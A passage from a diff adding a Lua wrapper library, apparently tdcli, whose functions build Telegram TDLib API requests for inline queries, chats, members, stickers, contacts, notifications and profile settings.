user_location_ = { +      ID = ""Location"", +      latitude_ = latitude, +      longitude_ = longitude +    }, +    query_ = query, +    offset_ = offset +  }, dl_cb, cmd) +end + +M.getInlineQueryResults = getInlineQueryResults + +-- Bots only. +-- Sets result of the inline query +-- @inline_query_id Identifier of the inline query +-- @is_personal Does result of the query can be cached only for specified user +-- @results Results of the query +-- @cache_time Allowed time to cache results of the query in seconds +-- @next_offset Offset for the next inline query, pass empty string if there is no more results +-- @switch_pm_text If non-empty, this text should be shown on the button, which opens private chat with the bot and sends bot start message with parameter switch_pm_parameter +-- @switch_pm_parameter Parameter for the bot start message +local function answerInlineQuery(inline_query_id, is_personal, cache_time, next_offset, switch_pm_text, switch_pm_parameter, dl_cb, cmd) +  tdcli_function ({ +    ID = ""AnswerInlineQuery"", +    inline_query_id_ = inline_query_id, +    is_personal_ = is_personal, +    results_ = results, --vector<InputInlineQueryResult>, +    cache_time_ = cache_time, +    next_offset_ = next_offset, +    switch_pm_text_ = switch_pm_text, +    switch_pm_parameter_ = switch_pm_parameter +  }, dl_cb, cmd) +end + +M.answerInlineQuery = answerInlineQuery + +-- Sends callback query to a bot and returns answer to it. +-- Unavailable for bots +-- @chat_id Identifier of the chat with a message +-- @message_id Identifier of the message, from which the query is originated +-- @payload Query payload +-- @text Text of the answer +-- @show_alert If true, an alert should be shown to the user instead of a toast +-- @url URL to be open +local function getCallbackQueryAnswer(chat_id, message_id, text, show_alert, url, dl_cb, cmd) +  tdcli_function ({ +    ID = ""GetCallbackQueryAnswer"", +    chat_id_ = chat_id, +    message_id_ = message_id, +    payload_ = { +      ID = ""CallbackQueryAnswer"", +      text_ = text, +      show_alert_ = show_alert, +      url_ = url +    }, +  }, dl_cb, cmd) +end + +M.getCallbackQueryAnswer = getCallbackQueryAnswer + +-- Bots only. +-- Sets result of the callback query +-- @callback_query_id Identifier of the callback query +-- @text Text of the answer +-- @show_alert If true, an alert should be shown to the user instead of a toast +-- @url Url to be opened +-- @cache_time Allowed time to cache result of the query in seconds +local function answerCallbackQuery(callback_query_id, text, show_alert, url, cache_time, dl_cb, cmd) +  tdcli_function ({ +    ID = ""AnswerCallbackQuery"", +    callback_query_id_ = callback_query_id, +    text_ = text, +    show_alert_ = show_alert, +    url_ = url, +    cache_time_ = cache_time +  }, dl_cb, cmd) +end + +M.answerCallbackQuery = answerCallbackQuery + +-- Bots only. +-- Updates game score of the specified user in the game +-- @chat_id Chat a message with the game belongs to +-- @message_id Identifier of the message +-- @edit_message True, if message should be edited +-- @user_id User identifier +-- @score New score +-- @force Pass True to update the score even if it decreases. If score is 0, user will be deleted from the high scores table +local function setGameScore(chat_id, message_id, edit_message, user_id, score, force, dl_cb, cmd) +  tdcli_function ({ +    ID = ""SetGameScore"", +    chat_id_ = chat_id, +    message_id_ = message_id, +    edit_message_ = edit_message, +    user_id_ = user_id, +    score_ = score, +    force_ = force +  }, dl_cb, cmd) +end + +M.setGameScore = setGameScore + +-- Bots only. +-- Updates game score of the specified user in the game +-- @inline_message_id Inline message identifier +-- @edit_message True, if message should be edited +-- @user_id User identifier +-- @score New score +-- @force Pass True to update the score even if it decreases. If score is 0, user will be deleted from the high scores table +local function setInlineGameScore(inline_message_id, edit_message, user_id, score, force, dl_cb, cmd) +  tdcli_function ({ +    ID = ""SetInlineGameScore"", +    inline_message_id_ = inline_message_id, +    edit_message_ = edit_message, +    user_id_ = user_id, +    score_ = score, +    force_ = force +  }, dl_cb, cmd) +end + +M.setInlineGameScore = setInlineGameScore + +-- Bots only. +-- Returns game high scores and some part of the score table around of the specified user in the game +-- @chat_id Chat a message with the game belongs to +-- @message_id Identifier of the message +-- @user_id User identifie +local function getGameHighScores(chat_id, message_id, user_id, dl_cb, cmd) +  tdcli_function ({ +    ID = ""GetGameHighScores"", +    chat_id_ = chat_id, +    message_id_ = message_id, +    user_id_ = user_id +  }, dl_cb, cmd) +end + +M.getGameHighScores = getGameHighScores + +-- Bots only. +-- Returns game high scores and some part of the score table around of the specified user in the game +-- @inline_message_id Inline message identifier +-- @user_id User identifier +local function getInlineGameHighScores(inline_message_id, user_id, dl_cb, cmd) +  tdcli_function ({ +    ID = ""GetInlineGameHighScores"", +    inline_message_id_ = inline_message_id, +    user_id_ = user_id +  }, dl_cb, cmd) +end + +M.getInlineGameHighScores = getInlineGameHighScores + +-- Deletes default reply markup from chat. +-- This method needs to be called after one-time keyboard or ForceReply reply markup has been used. +-- UpdateChatReplyMarkup will be send if reply markup will be changed +-- @chat_id Chat identifier +-- @message_id Message identifier of used keyboard +local function deleteChatReplyMarkup(chat_id, message_id, dl_cb, cmd) +  tdcli_function ({ +    ID = ""DeleteChatReplyMarkup"", +    chat_id_ = chat_id, +    message_id_ = message_id +  }, dl_cb, cmd) +end + +M.deleteChatReplyMarkup = deleteChatReplyMarkup + +-- Sends notification about user activity in a chat +-- @chat_id Chat identifier +-- @action Action description +-- action = Typing|Cancel|RecordVideo|UploadVideo|RecordVoice|UploadVoice|UploadPhoto|UploadDocument|GeoLocation|ChooseContact|StartPlayGame +local function sendChatAction(chat_id, action, progress, dl_cb, cmd) +  tdcli_function ({ +    ID = ""SendChatAction"", +    chat_id_ = chat_id, +    action_ = { +      ID = ""SendMessage"" .. action .. ""Action"", +      progress_ = progress or 100 +    } +  }, dl_cb, cmd) +end + +M.sendChatAction = sendChatAction + +-- Sends notification about screenshot taken in a chat. +-- Works only in secret chats +-- @chat_id Chat identifier +local function sendChatScreenshotTakenNotification(chat_id, dl_cb, cmd) +  tdcli_function ({ +    ID = ""SendChatScreenshotTakenNotification"", +    chat_id_ = chat_id +  }, dl_cb, cmd) +end + +M.sendChatScreenshotTakenNotification = sendChatScreenshotTakenNotification + +-- Chat is opened by the user. +-- Many useful activities depends on chat being opened or closed. For example, in channels all updates are received only for opened chats +-- @chat_id Chat identifier +local function openChat(chat_id, dl_cb, cmd) +  tdcli_function ({ +    ID = ""OpenChat"", +    chat_id_ = chat_id +  }, dl_cb, cmd) +end + +M.openChat = openChat + +-- Chat is closed by the user. +-- Many useful activities depends on chat being opened or closed. +-- @chat_id Chat identifier +local function closeChat(chat_id, dl_cb, cmd) +  tdcli_function ({ +    ID = ""CloseChat"", +    chat_id_ = chat_id +  }, dl_cb, cmd) +end + +M.closeChat = closeChat + +-- Messages are viewed by the user. +-- Many useful activities depends on message being viewed. For example, marking messages as read, incrementing of view counter, updating of view counter, removing of deleted messages in channels +-- @chat_id Chat identifier +-- @message_ids Identifiers of viewed messages +local function viewMessages(chat_id, message_ids, dl_cb, cmd) +  tdcli_function ({ +    ID = ""ViewMessages"", +    chat_id_ = chat_id, +    message_ids_ = message_ids -- vector +  }, dl_cb, cmd) +end + +M.viewMessages = viewMessages + +-- Message content is opened, for example the user has opened a photo, a video, a document, a location or a venue or have listened to an audio or a voice message +-- @chat_id Chat identifier of the message +-- @message_id Identifier of the message with opened content +local function openMessageContent(chat_id, message_id, dl_cb, cmd) +  tdcli_function ({ +    ID = ""OpenMessageContent"", +    chat_id_ = chat_id, +    message_id_ = message_id +  }, dl_cb, cmd) +end + +M.openMessageContent = openMessageContent + +-- Returns existing chat corresponding to the given user +-- @user_id User identifier +local function createPrivateChat(user_id, dl_cb, cmd) +  tdcli_function ({ +    ID = ""CreatePrivateChat"", +    user_id_ = user_id +  }, dl_cb, cmd) +end + +M.createPrivateChat = createPrivateChat + +-- Returns existing chat corresponding to the known group +-- @group_id Group identifier +local function createGroupChat(group_id, dl_cb, cmd) +  tdcli_function ({ +    ID = ""CreateGroupChat"", +    group_id_ = getChatId(group_id).ID +  }, dl_cb, cmd) +end + +M.createGroupChat = createGroupChat + +-- Returns existing chat corresponding to the known channel +-- @channel_id Channel identifier +local function createChannelChat(channel_id, dl_cb, cmd) +  tdcli_function ({ +    ID = ""CreateChannelChat"", +    channel_id_ = getChatId(channel_id).ID +  }, dl_cb, cmd) +end + +M.createChannelChat = createChannelChat + +-- Returns existing chat corresponding to the known secret chat +-- @secret_chat_id SecretChat identifier +local function createSecretChat(secret_chat_id, dl_cb, cmd) +  tdcli_function ({ +    ID = ""CreateSecretChat"", +    secret_chat_id_ = secret_chat_id +  }, dl_cb, cmd) +end + +M.createSecretChat = createSecretChat + +-- Creates new group chat and send corresponding messageGroupChatCreate, returns created chat +-- @user_ids Identifiers of users to add to the group +-- @title Title of new group chat, 0-255 characters +local function createNewGroupChat(user_ids, title, dl_cb, cmd) +  tdcli_function ({ +    ID = ""CreateNewGroupChat"", +    user_ids_ = user_ids, -- vector +    title_ = title +  }, dl_cb, cmd) +end + +M.createNewGroupChat = createNewGroupChat + +-- Creates new channel chat and send corresponding messageChannelChatCreate, returns created chat +-- @title Title of new channel chat, 0-255 characters +-- @is_supergroup True, if supergroup chat should be created +-- @about Information about the channel, 0-255 characters +local function createNewChannelChat(title, is_supergroup, about, dl_cb, cmd) +  tdcli_function ({ +    ID = ""CreateNewChannelChat"", +    title_ = title, +    is_supergroup_ = is_supergroup, +    about_ = about +  }, dl_cb, cmd) +end + +M.createNewChannelChat = createNewChannelChat + +-- Creates new secret chat, returns created chat +-- @user_id Identifier of a user to create secret chat with +local function createNewSecretChat(user_id, dl_cb, cmd) +  tdcli_function ({ +    ID = ""CreateNewSecretChat"", +    user_id_ = user_id +  }, dl_cb, cmd) +end + +M.createNewSecretChat = createNewSecretChat + +-- Creates new channel supergroup chat from existing group chat and send corresponding messageChatMigrateTo and messageChatMigrateFrom. Deactivates group +-- @chat_id Group chat identifier +local function migrateGroupChatToChannelChat(chat_id, dl_cb, cmd) +  tdcli_function ({ +    ID = ""MigrateGroupChatToChannelChat"", +    chat_id_ = chat_id +  }, dl_cb, cmd) +end + +M.migrateGroupChatToChannelChat = migrateGroupChatToChannelChat + +-- Changes chat title. +-- Title can\'t be changed for private chats. +-- Title will not change until change will be synchronized with the server. +-- Title will not be changed if application is killed before it can send request to the server. +-- There will be update about change of the title on success. Otherwise error will be returned +-- @chat_id Chat identifier +-- @title New title of a chat, 0-255 characters +local function changeChatTitle(chat_id, title, dl_cb, cmd) +  tdcli_function ({ +    ID = ""ChangeChatTitle"", +    chat_id_ = chat_id, +    title_ = title +  }, dl_cb, cmd) +end + +M.changeChatTitle = changeChatTitle + +-- Changes chat photo. +-- Photo can\'t be changed for private chats. +-- Photo will not change until change will be synchronized with the server. +-- Photo will not be changed if application is killed before it can send request to the server. +-- There will be update about change of the photo on success. Otherwise error will be returned +-- @chat_id Chat identifier +-- @photo New chat photo. You can use zero InputFileId to delete photo. Files accessible only by HTTP URL are not acceptable +local function changeChatPhoto(chat_id, photo, dl_cb, cmd) +  tdcli_function ({ +    ID = ""ChangeChatPhoto"", +    chat_id_ = chat_id, +    photo_ = getInputFile(photo) +  }, dl_cb, cmd) +end + +M.changeChatPhoto = changeChatPhoto + +-- Changes chat draft message +-- @chat_id Chat identifier +-- @draft_message New draft message, nullable +local function changeChatDraftMessage(chat_id, reply_to_message_id, text, disable_web_page_preview, clear_draft, parse_mode, dl_cb, cmd) +  local TextParseMode = getParseMode(parse_mode) + +  tdcli_function ({ +    ID = ""ChangeChatDraftMessage"", +    chat_id_ = chat_id, +    draft_message_ = { +      ID = ""DraftMessage"", +      reply_to_message_id_ = reply_to_message_id, +      input_message_text_ = { +        ID = ""InputMessageText"", +        text_ = text, +        disable_web_page_preview_ = disable_web_page_preview, +        clear_draft_ = clear_draft, +        entities_ = {}, +        parse_mode_ = TextParseMode, +      }, +    }, +  }, dl_cb, cmd) +end + +M.changeChatDraftMessage = changeChatDraftMessage + +-- Adds new member to chat. +-- Members can\'t be added to private or secret chats. +-- Member will not be added until chat state will be synchronized with the server. +-- Member will not be added if application is killed before it can send request to the server +-- @chat_id Chat identifier +-- @user_id Identifier of the user to add +-- @forward_limit Number of previous messages from chat to forward to new member, ignored for channel chats +local function addChatMember(chat_id, user_id, forward_limit, dl_cb, cmd) +  tdcli_function ({ +    ID = ""AddChatMember"", +    chat_id_ = chat_id, +    user_id_ = user_id, +    forward_limit_ = forward_limit or 50 +  }, dl_cb, cmd) +end + +M.addChatMember = addChatMember + +-- Adds many new members to the chat. +-- Currently, available only for channels. +-- Can\'t be used to join the channel. +-- Member will not be added until chat state will be synchronized with the server. +-- Member will not be added if application is killed before it can send request to the server +-- @chat_id Chat identifier +-- @user_ids Identifiers of the users to add +local function addChatMembers(chat_id, user_ids, dl_cb, cmd) +  tdcli_function ({ +    ID = ""AddChatMembers"", +    chat_id_ = chat_id, +    user_ids_ = user_ids -- vector +  }, dl_cb, cmd) +end + +M.addChatMembers = addChatMembers + +-- Changes status of the chat member, need appropriate privileges. +-- In channel chats, user will be added to chat members if he is yet not a member and there is less than 200 members in the channel. +-- Status will not be changed until chat state will be synchronized with the server. +-- Status will not be changed if application is killed before it can send request to the server +-- @chat_id Chat identifier +-- @user_id Identifier of the user to edit status, bots can be editors in the channel chats +-- @status New status of the member in the chat +-- status = Creator|Editor|Moderator|Member|Left|Kicked +local function changeChatMemberStatus(chat_id, user_id, status, dl_cb, cmd) +  tdcli_function ({ +    ID = ""ChangeChatMemberStatus"", +    chat_id_ = chat_id, +    user_id_ = user_id, +    status_ = { +      ID = ""ChatMemberStatus"" .. status +    }, +  }, dl_cb, cmd) +end + +M.changeChatMemberStatus = changeChatMemberStatus + +-- Returns information about one participant of the chat +-- @chat_id Chat identifier +-- @user_id User identifier +local function getChatMember(chat_id, user_id, dl_cb, cmd) +  tdcli_function ({ +    ID = ""GetChatMember"", +    chat_id_ = chat_id, +    user_id_ = user_id +  }, dl_cb, cmd) +end + +M.getChatMember = getChatMember + +-- Asynchronously downloads file from cloud. +-- Updates updateFileProgress will notify about download progress. +-- Update updateFile will notify about successful download +-- @file_id Identifier of file to download +local function downloadFile(file_id, dl_cb, cmd) +  tdcli_function ({ +    ID = ""DownloadFile"", +    file_id_ = file_id +  }, dl_cb, cmd) +end + +M.downloadFile = downloadFile + +-- Stops file downloading. +-- If file already downloaded do nothing. +-- @file_id Identifier of file to cancel download +local function cancelDownloadFile(file_id, dl_cb, cmd) +  tdcli_function ({ +    ID = ""CancelDownloadFile"", +    file_id_ = file_id +  }, dl_cb, cmd) +end + +M.cancelDownloadFile = cancelDownloadFile + +-- Next part of a file was generated +-- @generation_id Identifier of the generation process +-- @ready Number of bytes already generated. Negative number means that generation has failed and should be terminated +local function setFileGenerationProgress(generation_id, ready, dl_cb, cmd) +  tdcli_function ({ +    ID = ""SetFileGenerationProgress"", +    generation_id_ = generation_id, +    ready_ = ready +  }, dl_cb, cmd) +end + +M.setFileGenerationProgress = setFileGenerationProgress + +-- Finishes file generation +-- @generation_id Identifier of the generation process +local function finishFileGeneration(generation_id, dl_cb, cmd) +  tdcli_function ({ +    ID = ""FinishFileGeneration"", +    generation_id_ = generation_id +  }, dl_cb, cmd) +end + +M.finishFileGeneration = finishFileGeneration + +-- Generates new chat invite link, previously generated link is revoked. +-- Available for group and channel chats. +-- Only creator of the chat can export chat invite link +-- @chat_id Chat identifier +local function exportChatInviteLink(chat_id, dl_cb, cmd) +  tdcli_function ({ +    ID = ""ExportChatInviteLink"", +    chat_id_ = chat_id +  }, dl_cb, cmd) +end + +M.exportChatInviteLink = exportChatInviteLink + +-- Checks chat invite link for validness and returns information about the corresponding chat +-- @invite_link Invite link to check. Should begin with ""https://telegram.me/joinchat/"" +local function checkChatInviteLink(link, dl_cb, cmd) +  tdcli_function ({ +    ID = ""CheckChatInviteLink"", +    invite_link_ = link +  }, dl_cb, cmd) +end + +M.checkChatInviteLink = checkChatInviteLink + +-- Imports chat invite link, adds current user to a chat if possible. +-- Member will not be added until chat state will be synchronized with the server. +-- Member will not be added if application is killed before it can send request to the server +-- @invite_link Invite link to import. Should begin with ""https://telegram.me/joinchat/"" +local function importChatInviteLink(invite_link, dl_cb, cmd) +  tdcli_function ({ +    ID = ""ImportChatInviteLink"", +    invite_link_ = invite_link +  }, dl_cb, cmd) +end + +M.importChatInviteLink = importChatInviteLink + +-- Adds user to black list +-- @user_id User identifier +local function blockUser(user_id, dl_cb, cmd) +  tdcli_function ({ +    ID = ""BlockUser"", +    user_id_ = user_id +  }, dl_cb, cmd) +end + +M.blockUser = blockUser + +-- Removes user from black list +-- @user_id User identifier +local function unblockUser(user_id, dl_cb, cmd) +  tdcli_function ({ +    ID = ""UnblockUser"", +    user_id_ = user_id +  }, dl_cb, cmd) +end + +M.unblockUser = unblockUser + +-- Returns users blocked by the current user +-- @offset Number of users to skip in result, must be non-negative +-- @limit Maximum number of users to return, can\'t be greater than 100 +local function getBlockedUsers(offset, limit, dl_cb, cmd) +  tdcli_function ({ +    ID = ""GetBlockedUsers"", +    offset_ = offset, +    limit_ = limit +  }, dl_cb, cmd) +end + +M.getBlockedUsers = getBlockedUsers + +-- Adds new contacts/edits existing contacts, contacts user identifiers are ignored. +-- Returns list of corresponding users in the same order as input contacts. +-- If contact doesn\'t registered in Telegram, user with id == 0 will be returned +-- @contacts List of contacts to import/edit +local function importContacts(phone_number, first_name, last_name, user_id, dl_cb, cmd) +  tdcli_function ({ +    ID = ""ImportContacts"", +    contacts_ = {[0] = { +      phone_number_ = tostring(phone_number), +      first_name_ = tostring(first_name), +      last_name_ = tostring(last_name), +      user_id_ = user_id +      }, +    }, +  }, dl_cb, cmd) +end + +M.importContacts = importContacts + +-- Searches for specified query in the first name, last name and username of the known user contacts +-- @query Query to search for, can be empty to return all contacts +-- @limit Maximum number of users to be returned +local function searchContacts(query, limit, dl_cb, cmd) +  tdcli_function ({ +    ID = ""SearchContacts"", +    query_ = query, +    limit_ = limit +  }, dl_cb, cmd) +end + +M.searchContacts = searchContacts + +-- Deletes users from contacts list +-- @user_ids Identifiers of users to be deleted +local function deleteContacts(user_ids, dl_cb, cmd) +  tdcli_function ({ +    ID = ""DeleteContacts"", +    user_ids_ = user_ids -- vector +  }, dl_cb, cmd) +end + +M.deleteContacts = deleteContacts + +-- Returns profile photos of the user. +-- Result of this query can\'t be invalidated, so it must be used with care +-- @user_id User identifier +-- @offset Photos to skip, must be non-negative +-- @limit Maximum number of photos to be returned, can\'t be greater than 100 +local function getUserProfilePhotos(user_id, offset, limit, dl_cb, cmd) +  tdcli_function ({ +    ID = ""GetUserProfilePhotos"", +    user_id_ = user_id, +    offset_ = offset, +    limit_ = limit +  }, dl_cb, cmd) +end + +M.getUserProfilePhotos = getUserProfilePhotos + +-- Returns stickers corresponding to given emoji +-- @emoji String representation of emoji. If empty, returns all known stickers +local function getStickers(emoji, dl_cb, cmd) +  tdcli_function ({ +    ID = ""GetStickers"", +    emoji_ = emoji +  }, dl_cb, cmd) +end + +M.getStickers = getStickers + +-- Returns list of installed sticker sets without archived sticker sets +-- @is_masks Pass true to return masks, pass false to return stickers +local function getStickerSets(is_masks, dl_cb, cmd) +  tdcli_function ({ +    ID = ""GetStickerSets"", +    is_masks_ = is_masks +  }, dl_cb, cmd) +end + +M.getStickerSets = getStickerSets + +-- Returns list of archived sticker sets +-- @is_masks Pass true to return masks, pass false to return stickers +-- @offset_sticker_set_id Identifier of the sticker set from which return the result +-- @limit Maximum number of sticker sets to return +local function getArchivedStickerSets(is_masks, offset_sticker_set_id, limit, dl_cb, cmd) +  tdcli_function ({ +    ID = ""GetArchivedStickerSets"", +    is_masks_ = is_masks, +    offset_sticker_set_id_ = offset_sticker_set_id, +    limit_ = limit +  }, dl_cb, cmd) +end + +M.getArchivedStickerSets = getArchivedStickerSets + +-- Returns list of trending sticker sets +local function getTrendingStickerSets(dl_cb, cmd) +  tdcli_function ({ +    ID = ""GetTrendingStickerSets"" +  }, dl_cb, cmd) +end + +M.getTrendingStickerSets = getTrendingStickerSets + +-- Returns list of sticker sets attached to a file, currently only photos and videos can have attached sticker sets +-- @file_id File identifier +local function getAttachedStickerSets(file_id, dl_cb, cmd) +  tdcli_function ({ +    ID = ""GetAttachedStickerSets"", +    file_id_ = file_id +  }, dl_cb, cmd) +end + +M.getAttachedStickerSets = getAttachedStickerSets + +-- Returns information about sticker set by its identifier +-- @set_id Identifier of the sticker set +local function getStickerSet(set_id, dl_cb, cmd) +  tdcli_function ({ +    ID = ""GetStickerSet"", +    set_id_ = set_id +  }, dl_cb, cmd) +end + +M.getStickerSet = getStickerSet + +-- Searches sticker set by its short name +-- @name Name of the sticker set +local function searchStickerSet(name, dl_cb, cmd) +  tdcli_function ({ +    ID = ""SearchStickerSet"", +    name_ = name +  }, dl_cb, cmd) +end + +M.searchStickerSet = searchStickerSet + +-- Installs/uninstalls or enables/archives sticker set. +-- Official sticker set can\'t be uninstalled, but it can be archived +-- @set_id Identifier of the sticker set +-- @is_installed New value of is_installed +-- @is_archived New value of is_archived +local function updateStickerSet(set_id, is_installed, is_archived, dl_cb, cmd) +  tdcli_function ({ +    ID = ""UpdateStickerSet"", +    set_id_ = set_id, +    is_installed_ = is_installed, +    is_archived_ = is_archived +  }, dl_cb, cmd) +end + +M.updateStickerSet = updateStickerSet + +-- Trending sticker sets are viewed by the user +-- @sticker_set_ids Identifiers of viewed trending sticker sets +local function viewTrendingStickerSets(sticker_set_ids, dl_cb, cmd) +  tdcli_function ({ +    ID = ""ViewTrendingStickerSets"", +    sticker_set_ids_ = sticker_set_ids -- vector +  }, dl_cb, cmd) +end + +M.viewTrendingStickerSets = viewTrendingStickerSets + +-- Changes the order of installed sticker sets +-- @is_masks Pass true to change masks order, pass false to change stickers order +-- @sticker_set_ids Identifiers of installed sticker sets in the new right order +local function reorderStickerSets(is_masks, sticker_set_ids, dl_cb, cmd) +  tdcli_function ({ +    ID = ""ReorderStickerSets"", +    is_masks_ = is_masks, +    sticker_set_ids_ = sticker_set_ids -- vector +  }, dl_cb, cmd) +end + +M.reorderStickerSets = reorderStickerSets + +-- Returns list of recently used stickers +-- @is_attached Pass true to return stickers and masks recently attached to photo or video files, pass false to return recently sent stickers +local function getRecentStickers(is_attached, dl_cb, cmd) +  tdcli_function ({ +    ID = ""GetRecentStickers"", +    is_attached_ = is_attached +  }, dl_cb, cmd) +end + +M.getRecentStickers = getRecentStickers + +-- Manually adds new sticker to the list of recently used stickers. +-- New sticker is added to the beginning of the list. +-- If the sticker is already in the list, at first it is removed from the list +-- @is_attached Pass true to add the sticker to the list of stickers recently attached to photo or video files, pass false to add the sticker to the list of recently sent stickers +-- @sticker Sticker file to add +local function addRecentSticker(is_attached, sticker, dl_cb, cmd) +  tdcli_function ({ +    ID = ""AddRecentSticker"", +    is_attached_ = is_attached, +    sticker_ = getInputFile(sticker) +  }, dl_cb, cmd) +end + +M.addRecentSticker = addRecentSticker + +-- Removes a sticker from the list of recently used stickers +-- @is_attached Pass true to remove the sticker from the list of stickers recently attached to photo or video files, pass false to remove the sticker from the list of recently sent stickers +-- @sticker Sticker file to delete +local function deleteRecentSticker(is_attached, sticker, dl_cb, cmd) +  tdcli_function ({ +    ID = ""DeleteRecentSticker"", +    is_attached_ = is_attached, +    sticker_ = getInputFile(sticker) +  }, dl_cb, cmd) +end + +M.deleteRecentSticker = deleteRecentSticker + +-- Clears list of recently used stickers +-- @is_attached Pass true to clear list of stickers recently attached to photo or video files, pass false to clear the list of recently sent stickers +local function clearRecentStickers(is_attached, dl_cb, cmd) +  tdcli_function ({ +    ID = ""ClearRecentStickers"", +    is_attached_ = is_attached +  }, dl_cb, cmd) +end + +M.clearRecentStickers = clearRecentStickers + +-- Returns emojis corresponding to a sticker +-- @sticker Sticker file identifier +local function getStickerEmojis(sticker, dl_cb, cmd) +  tdcli_function ({ +    ID = ""GetStickerEmojis"", +    sticker_ = getInputFile(sticker) +  }, dl_cb, cmd) +end + +M.getStickerEmojis = getStickerEmojis + +-- Returns saved animations +local function getSavedAnimations(dl_cb, cmd) +  tdcli_function ({ +    ID = ""GetSavedAnimations"", +  }, dl_cb, cmd) +end + +M.getSavedAnimations = getSavedAnimations + +-- Manually adds new animation to the list of saved animations. +-- New animation is added to the beginning of the list. +-- If the animation is already in the list, at first it is removed from the list. +-- Only non-secret video animations with MIME type ""video/mp4"" can be added to the list +-- @animation Animation file to add. Only known to server animations (i. e. successfully sent via message) can be added to the list +local function addSavedAnimation(animation, dl_cb, cmd) +  tdcli_function ({ +    ID = ""AddSavedAnimation"", +    animation_ = getInputFile(animation) +  }, dl_cb, cmd) +end + +M.addSavedAnimation = addSavedAnimation + +-- Removes animation from the list of saved animations +-- @animation Animation file to delete +local function deleteSavedAnimation(animation, dl_cb, cmd) +  tdcli_function ({ +    ID = ""DeleteSavedAnimation"", +    animation_ = getInputFile(animation) +  }, dl_cb, cmd) +end + +M.deleteSavedAnimation = deleteSavedAnimation + +-- Returns up to 20 recently used inline bots in the order of the last usage +local function getRecentInlineBots(dl_cb, cmd) +  tdcli_function ({ +    ID = ""GetRecentInlineBots"", +  }, dl_cb, cmd) +end + +M.getRecentInlineBots = getRecentInlineBots + +-- Get web page preview by text of the message. +-- Do not call this function to often +-- @message_text Message text +local function getWebPagePreview(message_text, dl_cb, cmd) +  tdcli_function ({ +    ID = ""GetWebPagePreview"", +    message_text_ = message_text +  }, dl_cb, cmd) +end + +M.getWebPagePreview = getWebPagePreview + +-- Returns notification settings for a given scope +-- @scope Scope to return information about notification settings +-- scope = Chat(chat_id)|PrivateChats|GroupChats|AllChats| +local function getNotificationSettings(scope, chat_id, dl_cb, cmd) +  tdcli_function ({ +    ID = ""GetNotificationSettings"", +    scope_ = { +      ID = \'NotificationSettingsFor\' .. scope, +      chat_id_ = chat_id or nil +    }, +  }, dl_cb, cmd) +end + +M.getNotificationSettings = getNotificationSettings + +-- Changes notification settings for a given scope +-- @scope Scope to change notification settings +-- @notification_settings New notification settings for given scope +-- scope = Chat(chat_id)|PrivateChats|GroupChats|AllChats| +local function setNotificationSettings(scope, chat_id, mute_for, show_preview, dl_cb, cmd) +  tdcli_function ({ +    ID = ""SetNotificationSettings"", +    scope_ = { +      ID = \'NotificationSettingsFor\' .. scope, +      chat_id_ = chat_id or nil +    }, +    notification_settings_ = { +      ID = ""NotificationSettings"", +      mute_for_ = mute_for, +      sound_ = ""default"", +      show_preview_ = show_preview +    } +  }, dl_cb, cmd) +end + +M.setNotificationSettings = setNotificationSettings + +-- Resets all notification settings to the default value. +-- By default the only muted chats are supergroups, sound is set to \'default\' and message previews are showed +local function resetAllNotificationSettings(dl_cb, cmd) +  tdcli_function ({ +    ID = ""ResetAllNotificationSettings"" +  }, dl_cb, cmd) +end + +M.resetAllNotificationSettings = resetAllNotificationSettings + +-- Uploads new profile photo for logged in user. +-- Photo will not change until change will be synchronized with the server. +-- Photo will not be changed if application is killed before it can send request to the server. +-- If something changes, updateUser will be sent +-- @photo_path Path to new profile photo +local function setProfilePhoto(photo_path, dl_cb, cmd) +  tdcli_function ({ +    ID = ""SetProfilePhoto"", +    photo_path_ = photo_path +  }, dl_cb, cmd) +end + +M.setProfilePhoto = setProfilePhoto + +-- Deletes profile photo. +-- If something changes, updateUser will be sent +-- @profile_photo_id Identifier of profile photo to delete +local function deleteProfilePhoto(profile_photo_id, dl_cb, cmd) +  tdcli_function ({ +    ID = ""DeleteProfilePhoto"", +    profile_photo_id_ = profile_photo_id +  }, dl_cb, cmd) +end + +M.deleteProfilePhoto = deleteProfilePhoto + +-- Changes first and last names of logged in user. +-- If something changes, updateUser will be sent +-- @first_name New value of user first name, 1-255 characters +-- @last_name New value of optional user last name, 0-255 characters +local function changeName(first_name, last_name, dl_cb, cmd) +  tdcli_function ({ +    ID = ""ChangeName"", +    first_name_ = first_name, +    last_name_ = last_name +  }, dl_cb, cmd) +end + +M.changeName = changeName + +-- Changes about information of logged in user +-- @about New value of userFull.about, 0-255 characters +local function changeAbout(about, dl_cb, cmd) +  tdcli_function ({ +    ID = ""ChangeAbout"", +    about_ = about +  }, dl_cb, cmd) +end + +M.changeAbout = changeAbout + +-- Changes username of logged in user. +-- If something changes, updateUser will be sent +-- @username New value of username. Use empty string to remove username +local function changeUsername(username, dl_cb, cmd) +  tdcli_function ({ +    ID = ""ChangeUsername"", +    username_ = username +  }, dl_cb, cmd) +end + +M.changeUsername = changeUsername + +-- Changes user\'s phone number and sends authentication code to the new user\'s phone number. +-- Returns authStateWaitCode with information about sent code on success +-- @phone_number New user\'s phone number in any reasonable format +-- @allow_flash_call Pass True, if code can be sent via flash call to the specified phone number +-- @is_current_phone_number Pass true, if the phone number is used on the current device. Ignored if allow_flash_call is False +local function changePhoneNumber(phone_number, allow_flash_call, is_current_phone_number, dl_cb, cmd) +  tdcli_function ({ +    ID = ""ChangePhoneNumber"", +    phone_number_ = phone_number, +    allow_flash_call_ = allow_flash_call, +    is_current_phone_number_ = is_current_phone_number +  }, dl_cb, cmd) +end + +M.changePhoneNumber = changePhoneNumber + +-- Resends authentication code sent to change user\'s phone number. +-- Works only if in previously received authStateWaitCode next_code_type was not null. +-- Returns authStateWaitCode on success +local function resendChangePhoneNumberCode(dl_cb, cmd) +  tdcli_function ({ +    ID = ""ResendChangePhoneNumberCode"", +  }, dl_cb, cmd) +end + +M.resendChangePhoneNumberCode = resendChangePhoneNumberCode + +-- Checks authentication code sent to change user\'s phone number. +-- Returns authStateOk on success +-- @code Verification code from SMS, voice call or flash call +local function checkChangePhoneNumberCode(code, dl_cb, cmd) +  tdcli_function ({ +    ID = ""CheckChangePhoneNumberCode"", +    code_ = code +  }, dl_cb, cmd) +end + +M.checkChangePhoneNumberCode = checkChangePhoneNumberCode + +-- Returns all active sessions of logged in user +local function getActiveSessions(dl_cb, cmd) +  tdcli_function ({ +    ID = ""GetActiveSessions"", +  }, dl_cb, cmd) +end + +M.getActiveSessions = getActiveSessions + +-- Terminates another session of logged in user +-- @session_id Session identifier +local function terminateSession(session_id, dl_cb, cmd) +  tdcli_function ({ +    ID = ""TerminateSession"", +    session_id_ = session_id +  }, dl_cb, cmd) +end + 